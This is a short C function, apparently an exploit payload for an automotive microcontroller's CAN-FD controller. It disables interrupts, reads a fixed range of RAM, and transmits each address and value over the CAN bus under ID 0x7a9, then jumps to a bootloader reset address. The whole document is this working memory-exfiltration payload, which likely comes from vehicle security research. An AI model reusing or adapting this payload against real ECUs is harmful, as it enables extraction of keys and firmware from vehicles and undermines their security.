void exploit() {
    unsigned char* volatile RSCFDnCFDTMSTSp = 0xffd202d0;
    unsigned int* volatile RSCFDnCFDTMIDp  = 0xffd24000;
    unsigned int* volatile RSCFDnCFDTMDF0_p = 0xffd2400c;
    unsigned int* volatile RSCFDnCFDTMDF1_p = 0xffd24010;
    unsigned int* volatile RSCFDnCFDTMPTRp = 0xffd24004;
    unsigned int* volatile RSCFDnCFDTMFDCTRp = 0xffd24008;
    unsigned char* volatile RSCFDnCFDTMCp = 0xffd20250;


    asm("di");

    int *addr = 0xfebe6e34;
    while (addr < 0xfebe6ff4) {
        int i = 0x10;

        if ((*(RSCFDnCFDTMSTSp + i) & 0b110) != 0) {
            continue;
        }

        // DLC
        *(RSCFDnCFDTMPTRp + 8 * i) = 0b1000 << 28;

        // ArbID
        *(RSCFDnCFDTMIDp + 8 * i) = 0x7a9;

        // Data
        *(RSCFDnCFDTMDF0_p + 8 * i) = ((int)addr << 8) | 0x07;
        *(RSCFDnCFDTMDF1_p + 8 * i) = *addr;

        // Classical frame
        *(RSCFDnCFDTMFDCTRp + 8 * i) = 0x0;

        // Request transmission (RSCFDnCFDTMCp.TMTR = 1)
        *(RSCFDnCFDTMCp + i) |= 0x1;

        // Wait for transmission to complete (RSCFDnCFDTMSTSp.TMTRF = 0)
        while ((*(RSCFDnCFDTMSTSp + i) & 0b110) == 0) {

        }

        // Clear TMTRF
        *(RSCFDnCFDTMSTSp + i) = *(RSCFDnCFDTMSTSp + i) & 0xf9;

        addr++;
    }

    void (*bl_reset)(void) = (void (*)(void))0x0000157e;
    bl_reset();
}
